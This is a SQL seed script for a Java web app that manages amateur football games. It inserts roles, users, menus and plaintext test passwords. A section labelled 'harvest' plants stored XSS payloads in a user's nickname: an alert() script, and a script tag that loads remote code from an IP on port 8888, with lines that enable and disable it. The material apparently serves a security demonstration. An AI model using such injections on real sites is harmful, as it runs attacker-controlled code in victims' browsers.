--select * from tb_perfil
insert into tb_perfil values (1, 'Administrador', 'br.com.srnimbus.amadorpro.jaas.AdministradorPrincipal.class');
insert into tb_perfil values (2, 'Usuario', 'br.com.srnimbus.amadorpro.jaas.UsuarioPrincipal.class');

--select * from tb_plano_pagamento
insert into tb_plano_pagamento values (1, 'Gratuito', '0');

--select * from tb_usuario
insert into tb_usuario values (1, 1, 'Diogo Rispoli', '72686200120', 'Didi', 'a@b.com');

--select * from tb_login
insert into tb_login values (1, 1, 'drispoli', '12345678');

--select * from tb_login_perfil
insert into tb_login_perfil values (1, 1);
insert into tb_login_perfil values (2, 1);

--select * from tb_menu
insert into tb_menu values (1, 2, 'Dados Pessoais', '', true);
insert into tb_menu values (2, 2, 'Pelada', '', true);

--select * from tb_submenu
--delete from tb_submenu

insert into tb_submenu values (1, 1, '/html/telefone.xhtml', 'Telefone',  true);
insert into tb_submenu values (2, 1, '/html/endereco.xhtml', 'Endereco', true);
insert into tb_submenu values (3, 2, '/html/agenda.xhtml', 'Agenda', true);

--menu administrador
insert into tb_menu values (3, 1, 'Administrador', '', true);
insert into tb_submenu values (4, 3, '/html/localpelada.xhtml', 'Local Pelada', true);
--update tb_submenu set id_menu = 3 where id_submenu = 4


--harvest
insert into tb_usuario values (2, 1, 'Harvest Test', '111111111111', 'Harv<script>alert("Alo Mundo")</script>', 'a@b.com');
insert into tb_login values (2, 2, 'harvest', '12345678');
insert into tb_login_perfil values (1, 2);
insert into tb_login_perfil values (2, 2);

--habilitar harvest, trocar IP
update tb_usuario set apelido = '<script src="http://10.230.9.24:8888/i"></script>' where id_usuario = 2;
--desabilitar harvest
update tb_usuario set apelido = 'Harv' where id_usuario = 2;

--Autenticacao e autorizacao
update tb_perfil set principal = 'admin' where id_perfil = 1;
update tb_perfil set principal = 'user' where id_perfil = 2;
